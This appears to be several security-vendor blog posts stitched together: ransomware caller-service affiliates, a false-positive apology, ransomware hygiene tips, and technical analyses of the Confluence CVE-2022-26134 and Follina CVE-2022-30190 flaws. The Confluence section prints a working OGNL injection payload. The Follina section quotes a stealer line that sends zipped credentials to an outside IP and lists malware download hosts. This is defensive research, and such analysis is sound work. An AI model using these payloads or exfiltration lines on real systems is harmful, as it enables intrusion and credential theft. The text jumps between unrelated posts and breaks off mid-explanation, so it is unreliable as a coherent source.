<p>These affiliates agree on a percentage of the ransom amount and provide a salary based on a long-term partnership. Sometimes even spam email formats are provided to get the target’s name, contact number, email, and property address, where it imitates people from various companies such as Blue Raven Solar, and Zillow home loans, among others, to lure them. Once the target falls for the scam and provides these details, the callers start engaging conversations where they convince the victims to install payloads provided by these affiliates.</p>
<p><img class=" wp-image-5528 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss4__-300x177.png" alt="" width="528" height="312" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss4__-300x177.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss4__.png 583w" sizes="(max-width: 528px) 100vw, 528px" /></p>
<p style="text-align: center"><em><i>Fig. 4 – Spam Mail to fetch personal details</i></em></p>
<p>Instead of sending documents that contain malicious links, the affiliates provide ISO files as attachments, carrying the actual ransomware payloads in an encrypted format that can bypass detections. In some cases, the affiliates do not get the ISO files to distribute them seamlessly. Instead, they get the encrypted ransomware payloads converted to ISO format using a separate set of coders.</p>
<p><img class=" wp-image-5529 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss10__.png" alt="" width="295" height="75" /></p>
<p style="text-align: center"><em><i>Fig. 5 – Spam Mail randomization (1)</i></em></p>
<p>Spammers demand at least 100,000 emails be sent out in bulk to work for a long-term partnership that gives options to randomize the email format, as shown below, where most of them are related to insurance data to lure the targets easily.</p>
<p><img class=" wp-image-5530 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss10___-300x57.png" alt="" width="536" height="102" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss10___-300x57.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss10___-570x108.png 570w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss10___.png 571w" sizes="(max-width: 536px) 100vw, 536px" /></p>
<p style="text-align: center"><em><i>Fig. 6 – Spam Mail randomization (2)</i></em></p>
<p><img class=" wp-image-5531 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss11__-300x137.png" alt="" width="540" height="247" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss11__-300x137.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss11__.png 576w" sizes="(max-width: 540px) 100vw, 540px" /></p>
<p style="text-align: center"><em><i>Fig. 7 – Spam Mail randomization (3)</i></em></p>
<h2><strong><b>Recent Campaigns</b></strong></h2>
<p>The recent <a href="https://www.advintel.io/post/bazarcall-advisory-the-essential-guide-to-call-back-phishing-attacks-that-revolutionized-the-data" data-wpel-link="external" target="_blank" rel="nofollow"><u>BazarCall</u></a> campaign, utilized by new groups that rose from Conti, sends out emails with phone numbers that read that the target has subscribed to a service with auto-renewal. As the victims contact the provided number to cancel the subscription, the operators convince them to allow remote access to their devices. While the conversation continues, a network operator sneaks into the target’s network to fetch initial access to the device to maintain a remote session later used to install a backdoor. Malware such as BazaarLoader, Trickbot, and IcedID was delivered as BazarCall’s tactics <a href="https://www.trellix.com/en-us/about/newsroom/stories/research/evolution-of-bazarcall-social-engineering-tactics.html" data-wpel-link="external" target="_blank" rel="nofollow"><u>evolved</u></a> that primarily target the US, Canada, and some Asian countries.</p>
<p>Threat actors are not only looking for English callers but other spoken languages like Spanish, Italian, German, and Norwegian, too, so that they can expand their targets.</p>
<p><img class=" wp-image-5532 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/authentic_need_callers-300x135.png" alt="" width="668" height="301" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/authentic_need_callers-300x135.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/authentic_need_callers-768x347.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/authentic_need_callers.png 1006w" sizes="(max-width: 668px) 100vw, 668px" /></p>
<p style="text-align: center"><em><i>Fig. 8 – Job search for callers</i></em></p>
<h2><strong><b>Conclusion</b></strong></h2>
<p>Corporate companies should be aware that threat actors are using caller services as a new way to infect their systems with payloads such as ransomware and other types of malware. These services provide multi-language operators who work with email spammers to spread malicious links. To protect against such attacks, it is crucial to take caution when receiving suspicious or unknown emails with URLs or attachments and to avoid clicking or opening them.</p>

<p>We sincerely regret the inconvenience caused. We immediately took necessary actions investigating the matter, thereby initiating a root cause analysis.</p>
<p>We would like to share that this issue was promptly resolved by 2:26 pm. The update package with the fix was made available and applied at the time of update to automatically restore the impacted files.</p>
<p>Based on our investigation, we would like to assure all our retail, enterprise, and government customers that their data safety is our utmost priority. Our cybersecurity solutions with comprehensive protection and sophisticated controls are fully capable to neutralize any such threat.</p>
<h3>What led to this false positive detection?</h3>
<ul>
<li>The issue was caused because of a signature that was targeted to detect XML files being used by malware in wild. Inadvertently though, the signature also detected XML content within some legitimate excel files, thus resulting in this False Positive.</li>
<li>Many signatures are written every day. They are pushed out to end devices in form of AV Updates, multiple times a day. Each update cycle picks all the signatures that were newly created since the last cycle and combines them into a package. This package is then released to customers, and is downloaded &amp; applied on end devices via live update functionality.</li>
<li>Each update package, before release, goes through extensive testing to ensure its contents will not have any side effects on the end user devices. If the contents of the update package have a False Positive risk, an alert is generated. And, when that happens, the respective signature is removed from the package. In this case though, owing to a human error in a non-automated step, the alarm was not generated. Thus, resulting in release of the offending signature.</li>
</ul>
<h3>How do we intended to mitigate this occurrence in future?</h3>
<ul>
<li>Majority of the pre-release testing happens via automated systems. These automations are being enhanced to include the step where the error happened.</li>
<li>Additionally, the entire testing suite is being thoroughly reviewed. As part of this review, other human intervention steps would be considered for inclusion in automation as well. Also, this review will help identify any other blind spots.</li>
<li>Existing monitoring systems will be enhanced to cover the identified blind spots. Also, there are existing checklists that are used in steps requiring human intervention would be enhanced to cover any current gaps.</li>
</ul>
<p>Please write to us at <a href="mailto:support@quickheal.com">support@quickheal.com</a> for any clarification.</p>

<p><strong>9 Best Practices to Avoid Ransomware Infection</strong></p>
<p>Individuals and organizations must implement the best cybersecurity practices to avoid ransomware infection and data loss. In the past few years, ransomware has become a menace due to various platforms on the dark web offering ransomware as a service. One of the recent ransomware is called LockBit 3.0. It uses a double-extortion method first to encrypt the victim&#8217;s files and copy them onto another server.</p>
<p>Let&#8217;s look at the following:</p>
<ul>
<li>What is Ransomware?</li>
<li>How does Ransomware work?</li>
<li>How can you safeguard yourself against LockBit 3.0?</li>
<li>How SEQRITE Can Help</li>
</ul>
<p>How does Ransomware Infection Work?</p>
<p><strong>Ransomware </strong>is a type of malicious software, more like a form of malware that encrypts computer data. Once the data is encrypted, the user is asked to pay a ransom to the attackers to unlock their data.</p>
<p>Extortion through Ransomware involves stealing files and preventing access to them through encryption or blocking. It is similar to physical theft and ransom demands to release the items.</p>
<p>Even after paying the ransom, there is no guarantee that the hacker will give you access to your files or that it won&#8217;t happen again.</p>
<p><strong>The &#8220;WannaCry&#8221; ransomware attack from May 2017 is a classic example:</strong></p>
<p>Over <u><a href="https://www.gizmodo.com.au/2017/05/todays-massive-ransomware-attack-was-mostly-preventable-heres-how-to-avoid-it/" data-wpel-link="external" target="_blank" rel="nofollow">300,000 computers</a></u> worldwide, including government offices, police stations, hospitals, and ATMs, were affected during the 2017 attack. The problem was so severe that Microsoft extended security to support even older operating systems. The following year, <u><a href="https://thehackernews.com/2018/08/tsmc-wannacry-ransomware-attack.html" data-wpel-link="external" target="_blank" rel="nofollow">Taiwan Semiconductor Manufacturing Company</a></u> (TSMC) had to shut down 10,000 machines due to a new variant of WannaCry.</p>
<p>Similarly, in 2022, ransomware called &#8220;<strong>LockBit 3.0</strong>&#8221; infected various systems. LockBit is self-spreading ransomware that uses a double extortion method to extract as much money as possible from the victims.</p>
<p>&#8220;Double-extortion method&#8221; implies that the users are demanded ransom twice:</p>
<ul>
<li>Once to decrypt and access their files</li>
<li>Another time to prevent their files from being distributed or sold on the internet.</li>
</ul>
<p>Various other ransomware has since spread and caused multiple individual and organizational losses.</p>
<p>LockBit was discovered in 2019 and has since been used by its operators on a subscription basis through licenses acquired through the dark web. The most recent kind of LockBit has been dubbed <strong>LockBit 3.0</strong>.</p>
<p>The <strong>typical process of a LockBit 3.0 attack</strong> can be divided into three stages:</p>
<ol>
<li>Exploit</li>
<li>Infiltrate</li>
<li>Deploy</li>
</ol>
<p>During the <strong>exploit </strong>stage, the victim might be a target of phishing and unknowingly download the malware. There is also the possibility of facing brute-force attacks on their network. Once the malware has entered the network, LockBit 3.0 ransomware prepares the system for encryption.</p>
<p>Next, we have the <strong>infiltration </strong>stage. LockBit 3.0 infects the victim&#8217;s PC. It escalates the program privileges to achieve this. It then terminates some critical system services, such as SecurityHealthSystray.exe. Additionally, various services are stopped and deleted to prevent the ransomware from getting traced.</p>
<p><img class="alignnone size-full wp-image-5369" src="https://www.seqrite.com/blog/wp-content/uploads/2022/10/Lockbit3.0-b.jpg.png" alt="" width="750" height="330" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/10/Lockbit3.0-b.jpg.png 750w, https://www.seqrite.com/blog/wp-content/uploads/2022/10/Lockbit3.0-b.jpg-300x132.png 300w" sizes="(max-width: 750px) 100vw, 750px" /></p>
<p>Finally, at the <strong>deployment </strong>stage, it is ready to finish the process. It encrypts the files, and the affected files get suffixed by a string of random alphanumeric characters. The user&#8217;s wallpaper is changed along with the instructions to read the ransom note prefixed by the exact string of characters.</p>
<p>Who Can Be The Potential Target Of The LockBit 3.0 Ransomware Attack, And How Can It Create Various Challenges For Your Business?</p>
<p>Anyone can be a potential target of a ransomware attack. Broadly, we can consider two categories of victims:</p>
<ol>
<li><strong>Individuals</strong></li>
</ol>
<p>Any method used to attack an individual can also strike a company on a larger scale.</p>
<ol start="2">
<li><strong>Businesses</strong></li>
</ol>
<p>Any company with access to public servers is a potential target for ransomware attacks. Every company is, therefore, a potential target of this type of attack.</p>
<p><strong>How Can This Create Different Challenges For Your Business?</strong></p>
<p>Most ransomware attacks are designed to disrupt your company&#8217;s standard, day-to-day operations. All types of ransomware attacks pose different challenges to businesses:</p>
<ol>
<li><strong>Productivity</strong></li>
</ol>
<p>Productivity is a huge challenge that can impact your business. When your systems fail, your staff shuts down every day daily routines.</p>
<ol start="2">
<li><strong>Compliance</strong></li>
</ol>
<p>If you&#8217;re in an industry where compliance is high on your priority list, ransomware can make you non-compliant and even shut down your business.</p>
<ol start="3">
<li><strong>Revenue</strong></li>
</ol>
<p>One of the biggest challenges of ransomware attacks for businesses is lost revenue. This can be due to loss of productivity, legal lawsuits due to non-compliance, or loss of project-critical data.</p>
<ol start="4">
<li><strong>Loss of customer confidence</strong></li>
</ol>
<p>Becoming a victim of a ransomware attack can cause you to lose the trust of your customers and cost you a significant chunk of your business.</p>
<p><strong>How To Safeguard Your Organization?</strong></p>
<p>Now, what&#8217;s the solution? How to safeguard yourself and your organization from all these ransomware, malware, and cyberattacks without hindering your productivity, business compliance, and more?</p>
<p>The answer is simple yet hard to follow. Why?</p>
<p>Because you need to take care of details and keep a checklist ready to safeguard all your data, documents, files, and more from these malicious hackers and software, you need to have a cyber security solution that keeps your devices protected.</p>
<p>Here&#8217;s a list of 9 hygiene checks organizations should follow, even after buying a cyber security solution.</p>
<p><strong>9 Hygiene checks organizations should do Even After buying cyber security solutions:</strong></p>
<ol>
<li><strong>Install Antivirus</strong></li>
</ol>
<p>Every day, <u><a href="https://www.osqa.net/antivirus-statistics-facts-and-insights-that-you-must-know/learn/" data-wpel-link="external" target="_blank" rel="nofollow">350,000 viruses</a></u> are detected on laptops and computers. What do you think is the solution for this issue? Antivirus is! An antivirus gives your devices immunity to fight against ransomware, malware, or other cyber attackers. Take preventive actions today and install (and keep updated) antivirus on your business and personal devices.</p>
<p>Installing antiviruses takes the first and foremost step to attaining protection from cyberattacks. But you can never be too sure that other malware attacks will not attack you. Thus, you must follow through with the entire checklist.</p>
<ol start="2">
<li><strong>Stay Away From Pirated Software</strong></li>
</ol>
<p>Copied software can never replace the original one. They lack authenticity, and the pirated version is also not 100% trustworthy. Instead, there can be a hidden virus in the pirated version of security software.</p>
<p>Using pirated software is equal to <u><a href="https://blogs.microsoft.com/uploads/2016/04/IDCNUSFinalResearch.pdf" data-wpel-link="external" target="_blank" rel="nofollow">costing yourself billions</a></u>. This malicious software will create havoc in your system and damage your data. Therefore, you must not download or copy pirated versions of software.</p>
<ol start="3">
<li><strong>Take Regular Backup</strong></li>
</ol>
<p><u><a href="https://smallbiztrends.com/2017/04/not-prepared-for-data-loss.html" data-wpel-link="external" target="_blank" rel="nofollow">58% of small businesses</a></u> are never prepared for data loss. Thus, never miss out on your backups &#8211; make it a habit to do a regular data backup every week or month and create a secure archive of all your essential documents and files.</p>
<p>You should configure your cybersecurity solutions properly, select the files to be backed up based on their priority, and then take regular backups.</p>
<p>With regular data backups, you will never lose your data to inevitable or unplanned situations like system corruption, malware infection, hard drive crash, and more. It will help you recover all your data quickly and seamlessly.</p>
<ol start="4">
<li><strong>Avoid Clicking On Random Links</strong></li>
</ol>
<p>Randomly clicking attacks on your devices can lead to ransomware or malware attacks. Your devices will covertly download software intended to damage or disable your computer.</p>
<p>These random clicks can result in you being ghosted from your devices, your data being hostage to cyber attackers, leaking out your details, and getting access to all your personal information. Thus, quit clicking on random links.</p>
<ol start="5">
<li><strong>Disable Macros In Unknown MS Office Documents</strong></li>
</ol>
<p>Typically, macros are made for users to automate routine tasks like pulling data from different resources and compiling them in a single report. Of course, it makes life easy for you! But it also makes it easy for hackers to use malicious scripts in macros and exploit your computer.</p>
<p>So what&#8217;s the solution?</p>
<p>Avoid enabling macros to unknown MS office documents, especially the ones you download from the web or unidentified emails, as it has the power to not only damage your computer but also leak out your personal information.</p>
<ol start="6">
<li><strong>Audit Local/Domain Users And Remove Unwanted Users</strong></li>
</ol>
<p>Disabling, removing, or auditing stale or inactive user accounts from your organizations keeps your Active directory up-to-date and secure from insider attacks.</p>
<p>According to <u><a href="https://learn.microsoft.com/en-us/services-hub/health/remediation-steps-ad/regularly-check-for-and-remove-inactive-user-accounts-in-active-directory" data-wpel-link="external" target="_blank" rel="nofollow">Microsoft</a></u>, more than 10% of user accounts in your Active directory are either inactive or stale.</p>
<p>Thus, it would help if you made an effort to keep your directory safe from attackers, as they can damage your data and enterprise more. A hacker can access stale accounts and use them to get into your system and hack your data.</p>
<ol start="7">
<li><strong>Audit RDP &amp; SMB Access</strong></li>
</ol>
<p>RDP and SMB accesses are given to either traveling or remote workers. These two accesses permit employees to access networks from anywhere and communicate openly through an SMB protocol.</p>
<p>As a responsible employee, you must audit your RDP &amp; SMB access by changing your credentials so that the company faces no security risks or threats. If not, cyber hackers will steal the employee account credentials to deploy malware in your ecosystem.</p>
<ol start="8">
<li><strong>Use Strong Password</strong></li>
</ol>
<p>Your passwords are your first defence systems. Thus, you must put extra effort into creating strong passwords for your computers and other devices. A more robust password will take more effort to decode from hackers.</p>
<p>It will protect you from malicious software they want to deport to your computer systems. Thus, you must follow the rules for solid passwords, like using small and big alphabets and including a character and numerals. By adhering to some of these instructions, you can ensure the safety of your devices.</p>
<ol start="9">
<li><strong>Use Secure VPN To Access Specific Ports</strong></li>
</ol>
<p>A secure VPN allows you to create a safe funnel in your network to the outside internet and channel information through it. With VPN, you don&#8217;t need to export your ports to the outside internet.</p>
<p>It also helps you to set up secure public Wi-Fi connections, stream blocked websites, avoid ISP tracking, and more. VPN provides 100% authenticity, security, and data privacy to save your devices from cyber-attacks.</p>
<p><strong>How Can SEQRITE Be Your Shield Partner In This Journey?</strong></p>
<p>There is no guarantee that any of the above methods will work for you; Ransomware makers are constantly improving their products to stay ahead of cybersecurity. That&#8217;s why it&#8217;s essential to implement cybersecurity best practices to prevent ransomware infections at all costs. SEQRITE can help you in this process to safeguard your systems.</p>

<span class="rt-reading-time" style="display: block;"><span class="rt-label">Estimated reading time: </span><span class="rt-time">4</span><span class="rt-label"> minutes</span></span><p>On June 2, 2022, CVE-2022-26134 &#8220;Confluence,&#8221; a zero-day remote code execution vulnerability, was discovered in all versions of the Confluence Server and Data Center. The attack was detected to be of high severity (CVSS:9.0/10.0) according to a security <a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html" data-wpel-link="external" target="_blank" rel="nofollow">advisory</a> provided by Atlassian.</p>
<p>The critical severity vulnerability has received the ID of CVE-2022-26134, and a threat actor can exploit this vulnerability to perform unauthenticated remote code execution using OGNL injection. Last year also confluence faced a critical remote code execution vulnerability (CVE-2021-26084) in Confluence Server and Confluence Data Center. The vulnerability arises from an OGNL injection flaw and allows unauthenticated attackers to execute arbitrary code on Confluence Server or Data Center instances.</p>
<h3>What is an OGNL injection?</h3>
<p>An open-source Expression Language (EL) for Java objects is called Object-Graph Navigation Language. In particular, OGNL allows the evaluation of EL expressions in Apache Struts, the popular framework for creating Java-based web applications in business settings. The most severe flaws in Apache Struts are related to OGNL expression injection attacks, which let invalidated expressions be evaluated against the value stack, giving an attacker the ability to change system variables or run arbitrary code.</p>
<h3>Technical Analysis:</h3>
<p>CVE-2022-26134 is a remote code execution vulnerability resulting in code execution in the context of the Confluence server. A threat actor looking to utilize this vulnerability will place the malicious payload in the URI of an HTTP request. Any HTTP method appears to work, whether valid (GET, POST, PUT, etc.) or invalid.</p>
<p>The simplest form of a URL containing a malicious payload will be:</p>
<p><strong>%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/r7%22%29%7D/</strong></p>
<p>Above, the exploit is URL-encoded. When decoding the URL, we receive the following exploitation:</p>
<p><strong>${@java.lang.Runtime@getRuntime().exec(&#8220;touch /tmp/r7&#8221;)}</strong>, which will create a new file in the <strong>/tmp/</strong> directory.</p>
<p>In the captured GET request traffic below, you can see the threat actor is performing an OGNL injection to take advantage of the vulnerability present in the confluence.</p>
<p><img class="alignnone size-full wp-image-5311" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/traffic.png" alt="" width="870" height="155" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/traffic.png 870w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/traffic-300x53.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/traffic-768x137.png 768w" sizes="(max-width: 870px) 100vw, 870px" /></p>
<p style="text-align: center;"><em>Fig: 1</em></p>
<p>Threat actors looking to use this vulnerability but also need the compromised server&#8217;s response can use the X-Cmd-Response header.</p>
<p>For example, it is executing the id command and receiving the output in the X-Cmd-Response header of the response by the vulnerable server.<img class="alignnone size-full wp-image-5306" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/response.png" alt="" width="899" height="124" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/response.png 899w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/response-300x41.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/response-768x106.png 768w" sizes="(max-width: 899px) 100vw, 899px" /></p>
<p>&nbsp;</p>
<p style="text-align: center;"><em>Fig:2</em></p>
<h4>Root Cause:</h4>
<p>The root cause for the vulnerability is in the findValue(str) method within the translateVariables function. The server calls the translateVariables method as soon as it receives the HTTP request.</p>
<p>When the TextParseUtil method is called with the request URI given as the expression parameter in the method, after compiling the string and stripping it from the pattern &#8220;\\\\$\\\\{([^}]*)\\\\}&#8221; the remained code is transferred to the findValue method, which in this scenario executes the code.</p>
<p><img class="alignnone size-full wp-image-5308" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-72.png" alt="" width="885" height="472" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-72.png 885w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-72-300x160.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-72-768x410.png 768w" sizes="(max-width: 885px) 100vw, 885px" /></p>
<p style="text-align: center;"><em>Fig: 3</em></p>
<p>As mentioned, the main problem is the call for translateVariables with the URI as an argument. The fix Atlassian has provided includes various changes.</p>
<p>The first is adding a safe expression check for the input expression at the findValue method.</p>
<p>The second one is setting the finalNamespace and finalActionName variables without using the translateVariables method.</p>
<p>The last change is to remove OgnValueStack, given that it isn&#8217;t used if the translateVariables functions are not called.</p>
<h4>Before Patch:</h4>
<p><img class="alignnone size-full wp-image-5309" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-73.png" alt="" width="888" height="135" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-73.png 888w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-73-300x46.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-73-768x117.png 768w" sizes="(max-width: 888px) 100vw, 888px" /></p>
<p style="text-align: center;"><em>Fig: 4</em></p>
<h4>After Patch:</h4>
<p><img class="alignnone size-full wp-image-5307" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-71.png" alt="" width="724" height="146" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-71.png 724w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-71-300x60.png 300w" sizes="(max-width: 724px) 100vw, 724px" /></p>
<p style="text-align: center;"><em>Fig: 5</em></p>
<p>Atlassian also included SafeExpressionUtil.class in the xworks jar. To analyze expressions when findValue is called, SafeExpressionUtil.class has been put into OgnlValueStack.class to perform filtering of unsafe expressions. For instance:</p>
<p><img class="alignnone size-full wp-image-5310" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-78.png" alt="" width="794" height="204" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-78.png 794w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-78-300x77.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/Screenshot-78-768x197.png 768w" sizes="(max-width: 794px) 100vw, 794px" /></p>
<p style="text-align: center;"><em>Fig: 6</em></p>

<span class="rt-reading-time" style="display: block;"><span class="rt-label">Estimated reading time: </span><span class="rt-time">5</span><span class="rt-label"> minutes</span></span><p>On May 30, 2022, CVE-2022-30190 &#8220;FOLLINA,&#8221; a zero-day remote code execution vulnerability discovered in Microsoft Windows Support Diagnostic Tool (MSDT) with high severity (CVSS:9.3).</p>
<p>This MSDT tool diagnoses issues with applications such as Microsoft Office documents. Initial attack vector such as word documents uses a remote template functionality to download the HTML file, which then uses the URL protocol to call this diagnostic tool (MSDT) and execute malicious code. At the same time, the initial attacks were limited to Microsoft Word, but recently, attack vectors expanded to include the RTF and Outlook.</p>
<p>This vulnerability has been exploited in the wild, and threat actors that successfully influence it can execute arbitrary code and install additional programs. Threat actors are using this flaw to spread Backdoors, AsyncRAT, Quakbot, and other malware to consumers and sectors across North America and Europe.</p>
<h4><strong><b>Detailed Analysis of the Vulnerability:</b></strong></h4>
<p>The initial calling application to the MSDT tool will be Microsoft Office (Word, Excel, RTF etc.)</p>

<h6 style="text-align: center"><strong><em>Fig. Decoded data</em></strong></h6>
<p>This code stops the msdt.exe if it is running and connects to URL &#8220;hXXps [:]//seller-notification [.]live/Zgfbe234dg&#8221; and downloads a POWERSHELL script.</p>
<p>The Follina exploit has been used to deploy PowerShell-based Stealer. Let us look further into its contents:</p>
<p><img class="alignnone size-full wp-image-5279" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_3.png" alt="" width="1319" height="402" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_3.png 1319w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_3-300x91.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_3-768x234.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_3-1024x312.png 1024w" sizes="(max-width: 1319px) 100vw, 1319px" /></p>
<h6 style="text-align: center"><strong><em>Fig. Script Content part 1</em></strong></h6>
<p>The script enumerates inside Appdata/Roaming and tries to steal login data, cookies, etc. of the applications such as Firefox, Opera, Yandex, Vivaldi, CentBrowser, Comodo, Chedot, Orbitum, Chromium, Slimjet, Xvast, Kinza, Iridium, CocCoc, AVAST Software, Chrome, Outlook, Thunderbird, NetSarang, Windows Live, FileZilla, MobaXterm, WeChat.</p>
<p>The stealer queries the registry to steal information related to the following applications: Autodesk, MobaXterm, Oray SunLogin RemoteClient, MailMaster, Navicat, WinSCP, Microsoft Office, FTP, RAdmin, etc.</p>

<h6 style="text-align: center"><strong><em>Fig. Script Content part 2</em></strong></h6>
<p>Apart from this, it also collects information related to the machine:</p>
<ul>
<li>Systeminfo (which includes Hostname, OS-related info, Owner, BIOS info, Registered Owner<br />
Product ID, Original Install Date, System Boot Time, System Manufacturer, System Model, System Type, Processor, BIOS Version, System Locale, Time Zone Total Physical Memory, Domain, Logon Server etc.)</li>
<li>IP configuration(via Ipconfig)</li>
<li>Workstation Configuration</li>
<li>User Accounts information</li>
<li>Local Group Administrators</li>
<li>Product name versions</li>
</ul>
<p>A .zip file is created in %temp% and sent to URL:</p>
<p>$http_url = &#8220;hxxp://45[.]77.156[.]179:443/&#8221; + $ip + &#8220;&#8212;&#8212;&#8212;-&#8221; + $time1 + &#8220;.zip&#8221;</p>
<p>$time1 is the epoch timestamp calculated by</p>

<p>This acts as a Virtualization check as well.</p>
<p>Let us look into another example of Quakbot :</p>
<p>Phishing email containing malicious html attachments download archive files (.img) (ed63c189b52e4eb663598dc0c3121e05). This archive contains .lnk (76390978f26d3c6d7f799257542796ce), qbot payload (a14d48974eab6839b1238f984b3c28d2) and doc file (e7015438268464cedad98b1544d643ad).</p>
<p><img class="size-full wp-image-5264 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image10.png" alt="" width="554" height="279" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image10.png 554w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image10-300x151.png 300w" sizes="(max-width: 554px) 100vw, 554px" /></p>
<h6 style="text-align: center"><strong><em>Fig. Flow Diagram</em></strong></h6>
<p>The qbot payload in the zip is executed via .lnk, and the .doc file downloads the HTML file. This .html file again downloads another .qbot payload by exploiting Follina.</p>
<p>Here HTML file is downloaded from http[:]//185[.]234[.]247[.]119 and contains data shown in the following figure:-</p>
<p><img class="size-full wp-image-5266 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image11.png" alt="" width="1311" height="380" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image11.png 1311w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image11-300x87.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image11-768x223.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image11-1024x297.png 1024w" sizes="(max-width: 1311px) 100vw, 1311px" /></p>
<h6 style="text-align: center"><strong><em>Fig. HTML file data</em></strong></h6>
<p>This HTML connects to the above URLs and downloads Quakbot dll(ce86511634b5420332eb6267c0e2ae2e) which is then executed via regsvr32.exe</p>
<h4><strong><b>Analysis: </b></strong></h4>
<p><strong><b> </b></strong>This quakbot file is a Delphi compiled file having encrypted data in the .rsrc section inside RCDATA, which gets decrypted in the virtually allocated memory. The below figures shows the encrypted data and the Decryption loop.</p>
<p><img class="size-full wp-image-5276 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_1.png" alt="" width="602" height="226" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_1.png 602w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_1-300x113.png 300w" sizes="(max-width: 602px) 100vw, 602px" /></p>
<h6 style="text-align: center"><strong><em>Fig. Encrypted data </em></strong></h6>
<p><img class="size-full wp-image-5277 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_2.png" alt="" width="602" height="208" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_2.png 602w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image_2-300x104.png 300w" sizes="(max-width: 602px) 100vw, 602px" /></p>
<h6 style="text-align: center"><strong><em>Fig. Description loop</em></strong></h6>
<p>This gets decrypted into APIs and 1<sup>st</sup> stage PE file</p>
<p><img class="size-full wp-image-5268 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image13.png" alt="" width="592" height="257" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image13.png 592w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image13-300x130.png 300w" sizes="(max-width: 592px) 100vw, 592px" /></p>
<p>The flow now goes to the 1st stage, which is responsible for DLL Injection and brings the Quakbot payload into the memory. RC4 decryption is done on the encrypted strings, which brings in the list of the process such as AV-related processes etc. If they are found running, the payload exits. In the below figure, we can see the processes being checked.</p>
<p><img class="size-full wp-image-5269 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image14.png" alt="" width="602" height="133" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image14.png 602w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image14-300x66.png 300w" sizes="(max-width: 602px) 100vw, 602px" /></p>
<p>The list of the process being checked include:-</p>

<h4><strong><b>Bypass Techniques:</b></strong></h4>
<p>We have seen attackers use encoding methods in initial attack vectors to bypass detections. The following examples illustrate this.</p>
<p><img class="size-full wp-image-5272 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image17.png" alt="" width="553" height="193" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/image17.png 553w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/image17-300x105.png 300w" sizes="(max-width: 553px) 100vw, 553px" /></p>

<h6 style="text-align: center"><strong><em>Fig. Example no.2</em></strong></h6>
<h4><strong><b>Conclusion: </b></strong></h4>
<p>This is one of the most critical zero-days in recent times. This CVE has used many bypass techniques, lacks a fix, and can be easily exploited. After the security patch is available from Microsoft, Users should immediately fix it.

